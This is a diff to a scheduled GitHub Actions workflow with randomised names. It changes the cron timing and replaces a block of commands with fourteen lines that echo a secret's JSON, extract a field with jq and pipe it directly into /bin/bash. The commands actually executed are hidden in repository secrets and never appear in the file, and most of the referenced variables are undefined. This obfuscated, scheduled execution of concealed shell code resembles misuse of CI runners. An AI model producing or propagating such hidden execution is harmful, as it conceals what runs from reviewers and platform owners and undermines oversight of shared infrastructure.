@@ -3,9 +3,9 @@ name: xuezhongpaof
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3/6 * * *'
+    - cron: '12 4/6 * * *'
 
-jobs:  # 7242
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +13,20 @@ jobs:  # 7242
       - uses: actions/checkout@v4
       - name: xuezhongpaof
         env:
-          yt60: ${{ secrets.yt60 }}
+          s25735: ${{ secrets.s25735 }}
         run: |
-          echo $yt60 | jq -r .l67619 | /bin/bash
-          echo $l565 | jq -r .gb9 | /bin/bash
-          echo $cgmzo130 | jq -r .zvmxm84 | /bin/bash
-          echo $zu980 | jq -r .rooaw5 | /bin/bash
-          echo $dasz1885 | jq -r .x13567 | /bin/bash
-          echo $ajds2158 | jq -r .r97800 | /bin/bash
-          echo $xya108 | jq -r .mr2 | /bin/bash
+          echo $s25735 | jq -r .yodxt7 | /bin/bash
+          echo $on11 | jq -r .wkh40620 | /bin/bash
+          echo $tx0 | jq -r .hu18800 | /bin/bash
+          echo $o0261 | jq -r .rmqty8783 | /bin/bash
+          echo $b548 | jq -r .jdubr446 | /bin/bash
+          echo $qpyd8272 | jq -r .eaxjg1307 | /bin/bash
+          echo $rmyiu76477 | jq -r .u028 | /bin/bash
+          echo $t99 | jq -r .ca793 | /bin/bash
+          echo $ima8 | jq -r .wpue2 | /bin/bash
+          echo $srsg57 | jq -r .a9 | /bin/bash
+          echo $on8 | jq -r .nes2 | /bin/bash
+          echo $eas7897 | jq -r .xq1218 | /bin/bash
+          echo $qlfpu6 | jq -r .re63 | /bin/bash
+          echo $smqay30 | jq -r .ezb17881 | /bin/bash
 
